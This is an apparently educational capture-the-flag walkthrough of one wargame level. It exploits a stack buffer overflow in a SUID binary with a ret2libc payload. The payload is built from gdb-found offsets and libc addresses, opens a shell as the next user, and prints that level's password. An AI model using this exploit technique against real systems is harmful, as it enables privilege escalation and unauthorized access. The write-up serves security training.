# Level 01 — Practical walkthrough

> 🔓 **Flaw:** stack buffer overflow (`fgets` reads 100 bytes into a 64-byte buffer)
> 🎯 **Target:** the saved return address (EIP) of `main`
> 🛠️ **Technique:** ret2libc (return-to-libc) — jump to `system("/bin/sh")`.

All commands are run as user `level01`.

## 1. Observe the program

🟦 **Goal:** confirm the SUID bit and understand the login flow.

🟨 **Terminal:**

```bash
ls -l ./level01
./level01
```

⬜ **Output:**

```text
-rwsr-s---+ 1 level02 users 7360 Sep 10  2016 level01
********* ADMIN LOGIN PROMPT *********
Enter Username:
POTUS
verifying username....

nope, incorrect username...
```

The binary is owned by `level02` and SUID: exploiting it gives us `level02`'s rights. It
asks for a username, then (if the username is right) a password.

## 2. Read the checks

🟦 **Goal:** find the expected username/password and the real vulnerability.

🟨 **Terminal:**

```bash
gdb ./level01
```

🟨 **GDB:**

```gdb
info functions
disassemble main
disassemble verify_user_name
disassemble verify_user_pass
```

`info functions` lists the program's own functions (ignore the `@plt` libc stubs) — that
is how we discover `verify_user_name` and `verify_user_pass` and know to disassemble them.
Their names also show up on the `call ... <name>` lines inside `main`.

- `verify_user_name` does `strncmp(a_user_name, "dat_wil", 7)` → username must be **`dat_wil`**.
- `verify_user_pass` compares against `"admin"`, but in `main` its result is used in a
  tautological test (`== 0 || != 0`), so the password is **never actually enforced**.
- The real bug: `main` calls `fgets(password, 100, stdin)` while `password` is only **64
  bytes**. `fgets` can therefore write past the buffer and overwrite the saved return address.

## 3. Find the EIP offset

🟦 **Goal:** measure how many bytes of input reach the saved return address.

🟨 **GDB:** (feed a De Bruijn / cyclic pattern as the password and let it crash)

```gdb
run
```

🟨 **In the program**, type only the value at each prompt (the `Enter ...:` text is printed
by the program — don't type it):

- at `Enter Username:` type `dat_wil`
- at `Enter Password:` paste the cyclic pattern below

```text
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
```

⬜ **Output:**

```text
Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

`0x37634136` is `"6Ac7"` in little-endian. Locate it in the pattern:

🟨 **Terminal:**

```bash
python -c "
pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9'
import struct
print(pattern.find(struct.pack('<I', 0x37634136).decode()))
"
```

⬜ **Output:**

```text
80
```

So **80 bytes** of padding land exactly on the saved return address.

## 4. Find the libc addresses

🟦 **Goal:** collect the addresses needed for ret2libc — `system`, `exit`, and the string
`"/bin/sh"` (all live inside libc, mapped into the process).

🟨 **GDB:**

```gdb
break *main
run
print system
print exit
find &system, +9999999, "/bin/sh"
```

⬜ **Output:**

```text
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
0xf7f897ec
```

- `system` = `0xf7e6aed0`
- `exit`   = `0xf7e5eb70`
- `"/bin/sh"` = `0xf7f897ec`

We include `exit` so the shell returns cleanly instead of segfaulting on exit (a segfault
would be logged in `dmesg`).

## 5. Build the payload

🟦 **Goal:** overwrite the return address with a fake stack frame that calls
`system("/bin/sh")` then `exit()`.

```text
password = "A" * 80 + [ &system ] + [ &exit ] + [ &"/bin/sh" ]
```

The ret2libc frame layout after the padding:

```text
[ &system  ]  <- ret of main jumps here
[ &exit    ]  <- "return address" system sees (called after the shell)
[ &"/bin/sh" ] <- argument to system
```

Addresses are written little-endian (least significant byte first).

## 6. Run the exploit

🟦 **Goal:** send the username `dat_wil`, then the payload, keeping stdin open (`cat -`) so
the spawned shell stays interactive.

🟨 **Terminal:**

```bash
(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"'; cat -) | ./level01
```

Without `exit` you must still keep a 4-byte placeholder in `system`'s return slot (here
`BBBB`) — deleting it would shift `"/bin/sh"` out of the argument position. This variant opens
the shell just as well; it only segfaults *after* you leave the shell:

```bash
(python -c 'print "dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "BBBB" + "\xec\x97\xf8\xf7"'; cat -) | ./level01
```

🟨 **In the shell:**

```bash
whoami
cat /home/users/level02/.pass
```

⬜ **Output:**

```text
level02
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

## 7. Move to the next level

🟨 **Terminal:**

```bash
su level02
```

(Enter the password above.) Then:

🟨 **In the shell:**

```bash
whoami
```

⬜ **Output:**

```text
level02
```
